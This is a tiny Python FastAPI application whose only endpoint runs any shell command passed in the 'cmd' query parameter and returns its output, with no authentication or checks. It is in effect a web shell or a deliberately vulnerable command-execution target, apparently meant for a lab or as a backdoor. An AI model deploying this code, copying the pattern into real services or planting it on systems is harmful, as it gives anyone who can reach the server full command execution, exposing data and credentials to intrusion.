from fastapi import FastAPI
import subprocess

app = FastAPI()

@app.get("/")
def index(cmd: str = "id"):
    return {"output": subprocess.getoutput(cmd)}